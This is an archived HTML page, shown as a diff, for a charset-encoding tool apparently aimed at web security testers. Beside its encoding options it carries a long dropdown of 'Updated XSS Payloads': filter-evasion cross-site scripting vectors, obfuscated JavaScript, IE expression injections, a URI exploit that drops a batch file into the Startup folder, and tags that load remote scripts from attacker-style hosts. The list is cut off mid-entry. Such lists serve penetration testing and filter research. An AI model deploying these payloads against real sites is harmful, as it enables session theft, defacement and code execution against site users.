@@ -1,0 +1,332 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+	<head>
+<BASE HREF="http://h4k.in.wstub.archive.org/encoding/">
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<title>PHP Charset Encoder</title>
+		<link rel="Stylesheet" type="text/css" href="http://web.archive.org/web/20080328001343/http://h4k.in/encoding/assets/css/style.css" />		
+		<script type="text/javascript" src="http://web.archive.org/web/20080328001343js_/http://h4k.in/encoding/assets/js/deanedwards/my.js"></script>
+		<meta name="keywords" content="packer,javascript,compressor,obfuscator" />
+
+		<script src="http://web.archive.org/web/20080328001343js_/http://h4k.in/encoding/assets/js/deanedwards/base2-load.js" type="text/javascript"></script>
+		<script src="http://web.archive.org/web/20080328001343js_/http://h4k.in/encoding/assets/js/deanedwards/Packer.js" type="text/javascript"></script>
+		<script src="http://web.archive.org/web/20080328001343js_/http://h4k.in/encoding/assets/js/deanedwards/Words.js" type="text/javascript"></script>
+		<script type="text/javascript" src="http://web.archive.org/web/20080328001343js_/http://h4k.in/encoding/assets/js/_me/encode.js"></script> 		
+	</head>
+	<body>
+		<div>
+
+			<h1><span class="red">PHP</span><span class="small">Charset Encoder</span></h1>
+		</div>
+		<div id="info">
+			This tool helps you encoding arbitrary texts to and from <span class="underline"> 65 kinds</span> of charsets. Also some encoding functions featured by 
+			JavaScript are provided. Feel free to give <a href="mailto:&#109;&#97;&#114;&#105;&#111;&#46;&#104;&#101;&#105;&#100;&#101;&#114;&#105;&#99;&#104;&#64;&#103;&#109;&#97;&#105;&#108;&#46;&#99;&#111;&#109;">feedback</a> if you are missing something or if you found a bug.
+		</div>
+
+		<div>
+			<form method="post" action="index.php">
+				<fieldset>
+					<label for="input-encoding">input encoding</label>
+					<select name="input-encoding" id="input-encoding">
+					<option value="pass">pass</option>
+<option value="auto">auto</option>
+<option value="wchar">wchar</option>
+
+<option value="byte2be">byte2be</option>
+<option value="byte2le">byte2le</option>
+<option value="byte4be">byte4be</option>
+<option value="byte4le">byte4le</option>
+<option value="BASE64">BASE64</option>
+<option value="UUENCODE">UUENCODE</option>
+<option value="HTML-ENTITIES">HTML-ENTITIES</option>
+<option value="Quoted-Printable">Quoted-Printable</option>
+<option value="7bit">7bit</option>
+
+<option value="8bit">8bit</option>
+<option value="UCS-4">UCS-4</option>
+<option value="UCS-4BE">UCS-4BE</option>
+<option value="UCS-4LE">UCS-4LE</option>
+<option value="UCS-2">UCS-2</option>
+<option value="UCS-2BE">UCS-2BE</option>
+<option value="UCS-2LE">UCS-2LE</option>
+<option value="UTF-32">UTF-32</option>
+<option value="UTF-32BE">UTF-32BE</option>
+
+<option value="UTF-32LE">UTF-32LE</option>
+<option value="UTF-16">UTF-16</option>
+<option value="UTF-16BE">UTF-16BE</option>
+<option value="UTF-16LE">UTF-16LE</option>
+<option value="UTF-8" selected="selected">UTF-8</option>
+<option value="UTF-7">UTF-7</option>
+<option value="UTF7-IMAP">UTF7-IMAP</option>
+<option value="ASCII">ASCII</option>
+<option value="EUC-JP">EUC-JP</option>
+
+<option value="SJIS">SJIS</option>
+<option value="eucJP-win">eucJP-win</option>
+<option value="SJIS-win">SJIS-win</option>
+<option value="CP51932">CP51932</option>
+<option value="JIS">JIS</option>
+<option value="ISO-2022-JP">ISO-2022-JP</option>
+<option value="ISO-2022-JP-MS">ISO-2022-JP-MS</option>
+<option value="Windows-1252">Windows-1252</option>
+<option value="ISO-8859-1">ISO-8859-1</option>
+
+<option value="ISO-8859-2">ISO-8859-2</option>
+<option value="ISO-8859-3">ISO-8859-3</option>
+<option value="ISO-8859-4">ISO-8859-4</option>
+<option value="ISO-8859-5">ISO-8859-5</option>
+<option value="ISO-8859-6">ISO-8859-6</option>
+<option value="ISO-8859-7">ISO-8859-7</option>
+<option value="ISO-8859-8">ISO-8859-8</option>
+<option value="ISO-8859-9">ISO-8859-9</option>
+<option value="ISO-8859-10">ISO-8859-10</option>
+
+<option value="ISO-8859-13">ISO-8859-13</option>
+<option value="ISO-8859-14">ISO-8859-14</option>
+<option value="ISO-8859-15">ISO-8859-15</option>
+<option value="ISO-8859-16">ISO-8859-16</option>
+<option value="EUC-CN">EUC-CN</option>
+<option value="CP936">CP936</option>
+<option value="HZ">HZ</option>
+<option value="EUC-TW">EUC-TW</option>
+<option value="BIG-5">BIG-5</option>
+
+<option value="EUC-KR">EUC-KR</option>
+<option value="UHC">UHC</option>
+<option value="ISO-2022-KR">ISO-2022-KR</option>
+<option value="Windows-1251">Windows-1251</option>
+<option value="CP866">CP866</option>
+<option value="KOI8-R">KOI8-R</option>
+<option value="ArmSCII-8">ArmSCII-8</option>
+<option value="PUNYCODE">PUNYCODE</option>
+	
+					</select>
+
+					<label for="output-encoding">output encoding</label>
+					<select name="output-encoding" id="output-encoding">
+					<option value="pass">pass</option><option value="auto">auto</option><option value="wchar">wchar</option><option value="byte2be">byte2be</option><option value="byte2le">byte2le</option><option value="byte4be">byte4be</option><option value="byte4le">byte4le</option><option value="BASE64">BASE64</option><option value="UUENCODE">UUENCODE</option><option value="HTML-ENTITIES">HTML-ENTITIES</option><option value="Quoted-Printable">Quoted-Printable</option><option value="7bit">7bit</option><option value="8bit">8bit</option><option value="UCS-4">UCS-4</option><option value="UCS-4BE">UCS-4BE</option><option value="UCS-4LE">UCS-4LE</option><option value="UCS-2">UCS-2</option><option value="UCS-2BE">UCS-2BE</option><option value="UCS-2LE">UCS-2LE</option><option value="UTF-32">UTF-32</option><option value="UTF-32BE">UTF-32BE</option><option value="UTF-32LE">UTF-32LE</option><option value="UTF-16">UTF-16</option><option value="UTF-16BE">UTF-16BE</option><option value="UTF-16LE">UTF-16LE</option><option value="UTF-8">UTF-8</option><option value="UTF-7" selected="selected">UTF-7</option><option value="UTF7-IMAP">UTF7-IMAP</option><option value="ASCII">ASCII</option><option value="EUC-JP">EUC-JP</option><option value="SJIS">SJIS</option><option value="eucJP-win">eucJP-win</option><option value="SJIS-win">SJIS-win</option><option value="CP51932">CP51932</option><option value="JIS">JIS</option><option value="ISO-2022-JP">ISO-2022-JP</option><option value="ISO-2022-JP-MS">ISO-2022-JP-MS</option><option value="Windows-1252">Windows-1252</option><option value="ISO-8859-1">ISO-8859-1</option><option value="ISO-8859-2">ISO-8859-2</option><option value="ISO-8859-3">ISO-8859-3</option><option value="ISO-8859-4">ISO-8859-4</option><option value="ISO-8859-5">ISO-8859-5</option><option value="ISO-8859-6">ISO-8859-6</option><option value="ISO-8859-7">ISO-8859-7</option><option value="ISO-8859-8">ISO-8859-8</option><option value="ISO-8859-9">ISO-8859-9</option><option value="ISO-8859-10">ISO-8859-10</option><option value="ISO-8859-13">ISO-8859-13</option><option value="ISO-8859-14">ISO-8859-14</option><option value="ISO-8859-15">ISO-8859-15</option><option value="ISO-8859-16">ISO-8859-16</option><option value="EUC-CN">EUC-CN</option><option value="CP936">CP936</option><option value="HZ">HZ</option><option value="EUC-TW">EUC-TW</option><option value="BIG-5">BIG-5</option><option value="EUC-KR">EUC-KR</option><option value="UHC">UHC</option><option value="ISO-2022-KR">ISO-2022-KR</option><option value="Windows-1251">Windows-1251</option><option value="CP866">CP866</option><option value="KOI8-R">KOI8-R</option><option value="ArmSCII-8">ArmSCII-8</option><option value="PUNYCODE">PUNYCODE</option>					</select>&nbsp;<span style="position:relative;top:-10px">[<a href="#" title="Find it in Wiki" onclick="window.open('http://en.wikipedia.org/wiki/Special:Search?search='+document.getElementById('output-encoding').options[document.getElementById('output-encoding').selectedIndex].value+ ' Encoding')">charset info</a>]</span>
+
+				</fieldset>
+				<fieldset>
+					<button type="button" id="input-to-charcode" onclick="Encoder.toCharCode('input');">toCharCode()</button> 
+					<button type="button" id="input-to-urlencode" onclick="Encoder.toUrlEncode('input');">encodeURIComponent()</button> 
+					<button type="button" id="input-from-charcode" onclick="Encoder.fromCharCode('input');">fromCharCode()</button>
+					<button type="button" id="input-from-urlencode" onclick="Encoder.fromUrlEncode('input');">decodeURIComponent()</button> 
+                    <select id="encdec" onblur="setTimeout('document.getElementById(\'encdec\').selectedIndex=0',7000)">
+                    	<option>--Encoder/Decoder--</option>
+
+                        <optgroup label="Encode">                            
+                            <option onclick="Encoder.toDecEnt('input');">to decimal entities</option>
+                            <option onclick="Encoder.toHexEnt('input');">to HEX entities</option>
+                            <option onclick="Encoder.toUnicode('input');">to Unicode(%u00)</option>
+                            <option onclick="Encoder.toSQLHex('input');">to SQL HEX()</option>
+			                <option onclick="Encoder.toSQLChar('input');">to SQL Char()</option>
+                            <option onclick="Encoder.toOctEnt('input');">to octal JS entities</option>
+
+                            <option onclick="Encoder.toBase64('input');">to Base64</option>
+                            <option onclick="Encoder.toBase62('input');">to Base62</option>
+                        </optgroup>
+		                <optgroup label="Decode">                            
+                            <option onclick="Encoder.fromDecEnt('input');">from decimal entities</option>
+                            <option onclick="Encoder.fromHexEnt('input');">from HEX entities</option>
+                            <option onclick="Encoder.fromUnicode('input');">from Unicode(%u00)</option>
+
+                            <option onclick="Encoder.fromSQLHex('input');">from SQL HEX()</option>
+			                <option onclick="Encoder.fromSQLChar('input');">from SQL Char()</option>
+                            <option onclick="Encoder.fromOctEnt('input');">from octal JS entities</option>
+                            <option onclick="Encoder.fromBase64('input');">from Base64</option>
+							<option onclick="Encoder.fromBase62('input');">from Base62</option>                  
+                        </optgroup>
+		                <optgroup label="Convert">
+
+                            <option onclick="Encoder.fromBsToEnt('input');">from \NN to &amp;#NN;</option>
+                            <option onclick="Encoder.fromEntToBs('input');">from &amp;#NN; to \NN</option>
+							<option onclick="Encoder.fromPercent2Slash('input');">from % to \</option>
+                             
+				            <option onclick="Encoder.fromLftoCrlf('input');">from %0A to %0D%0A</option>
+                        </optgroup>
+                    </select> 
+					<select id="misc" onblur="setTimeout('document.getElementById(\'misc\').selectedIndex=0',7000)">
+
+					   <option>------- MISC -------</option>  
+					   <option onclick="Encoder.Reverse('input');">Reverse</option>               		 		     		 <option onclick="Encoder.IncrementChar('input');">Char++</option>
+					   <option onclick="Encoder.DecrementChar('input');">Char--</option>
+                       <option onclick="Encoder.Minify('input');">Minify</option>
+                       <option onclick="Encoder.CalcLength('input');">ContentLength</option><option onclick="Encoder.SaveCookie('input');">Save to Cookie</option><option onclick="Encoder.RestoreCookie('input');">Get from Cookie</option>
+
+					   <option onclick="alert('Cookie Data:\n'+document.cookie+'\n\n\nSize(max 16KB):\n'+document.cookie.length/1000+' KB')">View All Cookies</option>                					
+					</select>                       
+                    <select onchange="Encoder.fromVectorSource(this, 'input')">
+                        <option value="">-----------------Updated XSS Payloads---------------------</option>
+                        <option value="onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);">Add onclick event hadler</option><option value="&lt;s&gt;000&lt;s&gt;%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&amp;#60&amp;#115&amp;#62&amp;#51&amp;#51&amp;#51&amp;#60&amp;#47&amp;#115&amp;#62&amp;#x3c&amp;#x73&amp;#x3e&amp;#x34&amp;#x34&amp;#x34&amp;#x3c&amp;#x2f&amp;#x73&amp;#x3e">Advanced HTML injection locator</option><option value="';alert(0)//\';alert(1)//&quot;;alert(2)//\&quot;;alert(3)//--&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(4)&lt;/SCRIPT&gt;=&amp;{}&quot;);}alert(6);function xss(){//">Advanced XSS Locator</option><option value="';alert(0)//\';alert(1)//&quot;;alert(2)//\&quot;;alert(3)//--&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;/title&gt;&lt;SCRIPT&gt;alert(4)&lt;/SCRIPT&gt;=&amp;{&lt;/title&gt;&lt;script&gt;alert(5)&lt;/script&gt;}&quot;);}">Advanced XSS Locator for title-Injections</option><option value="aim: &amp;c:\windows\system32\calc.exe&quot; ini=&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat&quot;">aim: uri exploit</option><option value="&lt;div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;">Backslash-obfuscated XBL injection - variant 1</option><option value="&lt;div/style=&amp;#92&amp;#45&amp;#92&amp;#109&amp;#111&amp;#92&amp;#122&amp;#92&amp;#45&amp;
+#98&amp;#92&amp;#105&amp;#92&amp;#110&amp;#100&amp;#92&amp;#105&amp;#110&amp;#92&amp;#103:&amp;
+#92&amp;#117&amp;#114&amp;#108&amp;#40&amp;#47&amp;#47&amp;#98&amp;#117&amp;#115&amp;#105&amp;
+#110&amp;#101&amp;#115&amp;#115&amp;#92&amp;#105&amp;#92&amp;#110&amp;#102&amp;#111&amp;#46&amp;
+#99&amp;#111&amp;#46&amp;#117&amp;#107&amp;#92&amp;#47&amp;#108&amp;#97&amp;#98&amp;#115
+&amp;#92&amp;#47&amp;#120&amp;#98&amp;#108&amp;#92&amp;#47&amp;#120&amp;#98&amp;#108&amp;#92
+&amp;#46&amp;#120&amp;#109&amp;#108&amp;#92&amp;#35&amp;#120&amp;#115&amp;#115&amp;#41&amp;&gt;">Backslash-obfuscated XBL injection - variant 2</option><option value="&lt;Q%^&amp;*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;">Backslash-obfuscated XBL injection - variant 3</option><option value="&lt;div&amp;nbsp &amp;nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;">Backslash-obfuscated XBL injection - variant 4</option><option value="&lt;x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)&gt;">Backslash-obfuscated XBL injection - variant 5</option><option value="&lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&gt;">BASE</option><option value="`&gt; &lt;script&gt;alert(5)&lt;/script&gt;">Basic back ticked attribute breaker</option><option value="&gt; &lt;script&gt;alert(4)&lt;/script&gt;">Basic double quoted attribute breaker</option><option value="xyz onerror=alert(6); ">Basic JS breaker</option><option value="1;a=eval;b=alert;a(b(/c/.source));">Basic JS breaker variant 1</option><option value="1];a=eval;b=alert;a(b(17));//">Basic JS breaker variant 2</option><option value="];a=eval;b=alert;a(b(16));//">Basic JS breaker variant 3</option><option value="'];a=eval;b=alert;a(b(15));//">Basic JS breaker variant 4</option><option value="1};a=eval;b=alert;a(b(14));//">Basic JS breaker variant 5</option><option value="'};a=eval;b=alert;a(b(13));//">Basic JS breaker variant 6</option><option value="};a=eval;b=alert;a(b(12));//">Basic JS breaker variant 7</option><option value="a=1;a=eval;b=alert;a(b(11));//">Basic JS breaker variant 8</option><option value=";//%0da=eval;b=alert;a(b(10));//">Basic JS breaker variant 9</option><option value="';//%0da=eval;b=alert;a(b(9));//">Basic JS breaker variant 10</option><option value="'&gt; &lt;script&gt;alert(3)&lt;/script&gt;">Basic single quoted attribute breaker</option><option value="&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;">Basic title breaker</option><option value="&lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&gt;">BGSOUND</option><option value="&lt;BODY BACKGROUND=&quot;javascript:alert('XSS');&quot;&gt;">BODY background-image</option><option value="&lt;BODY ONLOAD=alert('XSS')&gt;">BODY ONLOAD</option><option value="&lt;!--
+&lt;A href=&quot;
+- --&gt;&lt;a href=javascript:alert:document.domain
+&gt;test--&gt;">Camouflaged comment injection with JS link</option><option value="&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;">Case Insensitive</option><option value="&lt;%3C&amp;lt&amp;lt;&amp;LT&amp;LT;&amp;#60&amp;#060&amp;#0060&amp;#00060&amp;#000060&amp;#0000060&amp;#60;&amp;#060;&amp;#0060;&amp;#00060;&amp;#000060;&amp;#0000060;&amp;#x3c&amp;#x03c&amp;#x003c&amp;#x0003c&amp;#x00003c&amp;#x000003c&amp;#x3c;&amp;#x03c;&amp;#x003c;&amp;#x0003c;&amp;#x00003c;&amp;#x000003c;&amp;#X3c&amp;#X03c&amp;#X003c&amp;#X0003c&amp;#X00003c&amp;#X000003c&amp;#X3c;&amp;#X03c;&amp;#X003c;&amp;#X0003c;&amp;#X00003c;&amp;#X000003c;&amp;#x3C&amp;#x03C&amp;#x003C&amp;#x0003C&amp;#x00003C&amp;#x000003C&amp;#x3C;&amp;#x03C;&amp;#x003C;&amp;#x0003C;&amp;#x00003C;&amp;#x000003C;&amp;#X3C&amp;#X03C&amp;#X003C&amp;#X0003C&amp;#X00003C&amp;#X000003C&amp;#X3C;&amp;#X03C;&amp;#X003C;&amp;#X0003C;&amp;#X00003C;&amp;#X000003C;\x3c\x3C\u003c\u003C">Character Encoding Example</option><option value="&lt;script&gt;
+var a = &quot;&lt;/script&gt; &lt;script&gt; alert('XSS !'); &lt;/script&gt; &lt;script&gt;&quot;;
+&lt;/script&gt;">Closing JS Tag in JS String assignment</option><option value="&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;&lt;![endif]--&gt;">Commented-out Block</option><option value="*/a=eval;b=alert;a(b(/e/.source));/*">Comment-breaker using obfuscated JavaScript</option><option value="width: expression((window.r==document.cookie)?'':alert(r=document.cookie))">Conditional style injection for IE</option><option value="&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;">Content Replace</option><option value="&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;&quot;&gt;">Cookie Manipulation</option><option value="&lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&gt;">DIV background-image 1</option><option value="&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert('XSS'))&quot;&gt;">DIV background-image 2</option><option value="&lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&gt;">DIV expression</option><option value="&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029&quot;&gt;">DIV w/Unicode</option><option value="&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;">Double open angle brackets</option><option value="&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;">Dword Encoding</option><option value="&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;">Embed Flash</option><option value="&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert('XSS');&quot;&gt;">Embedded Carriage Return</option><option value="&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert('XSS');&quot;&gt;">Embedded Encoded Tab</option><option value="&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert('XSS');&quot;&gt;">Embedded Newline</option><option value="&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;">Embedded Tab</option><option value="&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;">End title tag</option><option value="\&quot;;alert('XSS');//">Escaping JavaScript escapes</option><option value="&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Evade Regex Filter 1</option><option value="&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Evade Regex Filter 2</option><option value="&lt;SCRIPT a=&quot;blah&quot; '' SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Evade Regex Filter 3</option><option value="&lt;SCRIPT &quot;a='&gt;'&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Evade Regex Filter 4</option><option value="&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Evade Regex Filter 5</option><option value="eval(name)">Eval string contained in name property</option><option value="&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;">Extra dot for Absolute DNS</option><option value="&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;">Extraneous Open Brackets</option><option value="&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Filter Evasion 1</option><option value="&lt;SCRIPT a=&quot;&gt;'&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Filter Evasion 2</option><option value="&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;">Firefox Lookups 1</option><option value="&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;">Firefox Lookups 2</option><option value="&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;">Firefox Lookups 3</option><option value="firefoxurl:test|&quot;%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');&quot;">firefoxurl: uri exploit (UXSS)</option><option value="&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/FRAMESET&gt;">FRAME</option><option value="&lt;IMG SRC=`javascript:alert(&quot;RSnake says### 'XSS'&quot;)`&gt;">Grave Accents</option><option value="&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;">Half-Open HTML/JavaScript</option><option value="&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;">Hex Encoding</option><option value="&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;">Hex Encoding w/out Semicolons</option><option value="&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;">HTML Entities</option><option value="'';!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;{(alert(1))}">HTML Quoute &amp; Comment breaker</option><option value="&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;
+&lt;html:script&gt;
+alert(document.cookie);
+&lt;/html:script&gt;
+&lt;/html:html&gt;">HTML wrapped in XML</option><option value="&lt;img src=`x` onrerror= ` ;; alert(1) ` /&gt;">IE backticked semicolon injection</option><option value="&lt;/a style=&quot;&quot;xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')&quot;&gt;">IE closing-tag expression injection</option><option value=" style=color: expression(alert(0));&quot; a=&quot;">IE expression injection</option><option value="vbscript:Execute(MsgBox(chr(88)&amp;chr(83)&amp;chr(83)))&lt;">IE VB Messagebox injection</option><option value="&lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/IFRAME&gt;">IFRAME</option><option value="a=&lt;a&gt;
+&lt;b&gt;
+%3c%69%6d%67%2f%73%72%63%3d%31
+%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
+&lt;/b&gt;
+&lt;/a&gt;
+document.write(unescape(a..b))">Image onerror wrapped in XML statement</option><option value="&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;">Image tag with obfuscated JS URI</option><option value="&lt;IMG SRC=javascript:alert(String.fromCharCode(88###83###83))&gt;">Image w/CharCode</option><option value="&lt;IMG DYNSRC=&quot;javascript:alert('XSS');&quot;&gt;">IMG Dynsrc</option><option value="&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;">IMG Embedded commands 1</option><option value="Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser">IMG Embedded commands 2</option><option value="&lt;IMG LOWSRC=&quot;javascript:alert('XSS');&quot;&gt;">IMG Lowsrc</option><option value="&lt;IMG SRC=javascript:alert('XSS')&gt;">IMG No Quotes/Semicolon</option><option value="exp/*&lt;XSS STYLE='no\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&gt;">IMG STYLE w/expression</option><option value="&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;">IMG w/JavaScript Directive</option><option value="&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;">IMG w/VBscript</option><option value="&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&gt;">INPUT Image</option><option value="&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;">IP Encoding</option><option value="s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1">JavaScript concatenation vector variant 1</option><option value="s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;">JavaScript concatenation vector variant 2</option><option value="s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);">JavaScript concatenation vector variant 3</option><option value="s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];">JavaScript concatenation vector variant 4</option><option value="s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];">JavaScript concatenation vector variant 5</option><option value="s1=!''&amp;&amp;'jav';s2=!''&amp;&amp;'ascript';s3=!''&amp;&amp;':';s4=!''&amp;&amp;'aler';s5=!''&amp;&amp;'t';s6=!''&amp;&amp;'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;">JavaScript concatenation vector variant 6</option><option value="s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';">JavaScript concatenation vector variant 7</option><option value="&lt;BR SIZE=&quot;&amp;{alert('XSS')}&quot;&gt;">JavaScript Includes</option><option value="&lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&gt;XSS&lt;/A&gt;">JavaScript Link Location</option><option value="%0da=eval;b=alert;a(b(/d/.source));">JavaScript-breaker using carriage return</option><option value="&lt;a href          =              &quot;javas  cript   :ale                            rt(1)&quot;&gt;test">JS link with whitespace obfuscation</option><option value="+alert(0)+">JS string concatenation breaker</option><option value="&lt;body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;">JSON based obfuscated onload vector</option><option value="&lt;body onload=a1={x:this.parent.document};a1.x.writeln(1);&gt;">JSON based onload vector</option><option value="&lt;body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;">JSON based semicolon-onload vector</option><option value="&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;">LAYER</option><option value="&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS">List-style-image</option><option value="&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;">Livescript</option><option value="&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;">Local .htc file</option><option value="&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;">Long UTF-8 Unicode w/out Semicolons</option><option value="&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;">Malformed IMG Tags</option><option value="%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//">Markup breaker with special quotes</option><option value="&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&gt;">META</option><option value="&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&gt;">META w/additional 